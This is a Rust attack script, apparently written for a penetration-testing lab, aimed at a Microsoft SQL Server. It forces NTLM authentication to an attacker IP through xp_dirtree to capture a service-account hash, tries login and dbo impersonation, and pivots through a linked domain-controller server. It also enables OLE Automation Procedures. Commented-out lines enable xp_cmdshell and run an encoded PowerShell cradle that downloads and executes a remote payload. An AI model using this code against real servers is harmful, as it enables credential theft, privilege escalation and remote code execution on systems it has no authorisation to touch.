use async_std::net::TcpStream;
use anyhow;

use tiberius::{Config, AuthMethod, Client, Query, QueryStream, Row};

async fn db_conn() -> anyhow::Result<Client<TcpStream>> {
    let mut config = Config::new();
    config.host("appsrv01.corp1.com"); // dc01
    config.database("master");
    config.port(1433);
    config.trust_cert();

    config.authentication(AuthMethod::Integrated);

    let tcp: TcpStream = TcpStream::connect(config.get_addr()).await?;
    tcp.set_nodelay(true)?;

    let client: Client<TcpStream> = Client::connect(config, tcp).await?;

    Ok(client)
}

async fn get_query(client: &mut Client<TcpStream>, query: &str, is_str: bool) -> anyhow::Result<Vec<String>> {
    let select: Query = Query::new(query);
    let stream: QueryStream = select.query(client).await?;

    let rows: Vec<Row> = stream.into_first_result().await?;
    let mut rowtext: Vec<String> = Vec::new();
    for (_, row) in rows.iter().enumerate() {
        if is_str {
            rowtext.push(row.get::<&str, _>(0).unwrap().to_string());
        } else {
            rowtext.push(row.get::<i32, _>(0).unwrap().to_string());
        }
    }

    Ok(rowtext)
}

async fn execute_query(client: &mut Client<TcpStream>, query: &str) {
   let exec: Query = Query::new(query);
   let stream: Result<QueryStream, _> = exec.query(client).await;
   stream.ok();
}

#[async_std::main]
async fn main() {
    println!("[+] Connecting to database...");
    let mut conn: Client<TcpStream> = db_conn().await.expect("[!] Auth failed!");
    println!("[+] Auth OK!");

    let user: Vec<String> = get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap();
    let m_user: Vec<String> = get_query(&mut conn, "SELECT USER_NAME()", true).await.unwrap();
    let public_role: Vec<String> = get_query(&mut conn, "SELECT IS_SRVROLEMEMBER('public')", false).await.unwrap();
    let sysadmin_role: Vec<String> = get_query(&mut conn, "SELECT IS_SRVROLEMEMBER('sysadmin')", false).await.unwrap();

    println!("--> Logged in as: {}", user[0]);
    println!("--> Mapped to user: {}", m_user[0]);

    if public_role[0].parse::<i32>().unwrap() == 1 {
        println!("--> User is a member of public role");
    } else {
        println!("--> User is NOT a member of public role");
    }

    if sysadmin_role[0].parse::<i32>().unwrap() == 1 {
        println!("--> User is a member of sysadmin");
    } else {
        println!("--> User is NOT a member of sysadmin");
    }

    println!("[+] Attempting auth back to get svc account hash...Check Responder!");
    let mut query: String = String::from("EXEC master..xp_dirtree \"\\\\192.168.49.75\\\\test\"");
    execute_query(&mut conn, &query).await;

    println!("[+] Checking for users that can be impersonated...");
    query = String::from("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'");
    let impersonate_users: Vec<String> = get_query(&mut conn, &query, true).await.unwrap();
    println!("--> Users that can be impersonated: {:?}", impersonate_users);

    if impersonate_users.len() > 0 {
        println!("[+] Trying to impersonate {}", impersonate_users[0]);
        query = String::from(format!("EXECUTE AS LOGIN = '{}'", impersonate_users[0]));
        execute_query(&mut conn, &query).await;

        if get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0] != user[0] {
            println!("[+] Success!");
            println!("--> Now logged in as: {}", get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0]);
        } else {
            println!("[!] Could not impersonate user!");
            println!("[+] Trying to impersonate dbo user...");
            query = String::from("use msdb; EXECUTE AS USER = 'dbo'");
            execute_query(&mut conn, &query).await;
            let curr_user: Vec<String> = get_query(&mut conn, "SELECT USER_NAME()", true).await.unwrap();
            if curr_user[0] == "dbo" {
                println!("[+] Success! Now executing as {}", curr_user[0]);
            } else {
                println!("[!] Could not impersonate dbo user");
            }
        }
    }

    println!("[+] Checking for linked SQL servers...");
    let linked: Vec<String> = get_query(&mut conn, "EXEC sp_linkedservers", true).await.unwrap();
    println!("--> {:?}", linked);

    // let cmd_res: Vec<String> = get_query(&mut conn, "select version from openquery(\"dc01\", 'select @@version as version')", true).await.unwrap();
    // println!("{}", cmd_res[0]);

    let sub_query: String = String::from("select SYSTEM_USER as s_user"); 
    query = String::from(format!("select s_user from openquery(\"dc01\", '{}')", &sub_query));
    println!("--> Executing as {} on DC01:", get_query(&mut conn, &query, true).await.unwrap()[0]);

    // println!("[+] Enabling xp_cmdshell");
    // query = String::from("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
    // execute_query(&mut conn, &query).await;

    // println!("[+] Executing command 'whoami'");
    // execute_query(&mut conn, "EXEC xp_cmdshell 'curl http://192.168.49.79/hellooooo'").await;
    println!("[+] Enabling OLE Automation Procedures");
    query = String::from("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE");
    execute_query(&mut conn, &query).await;

    println!("[+] Executing command");
    // query = String::from("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAOQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==\"'");
    // execute_query(&mut conn, &query).await;

        
}
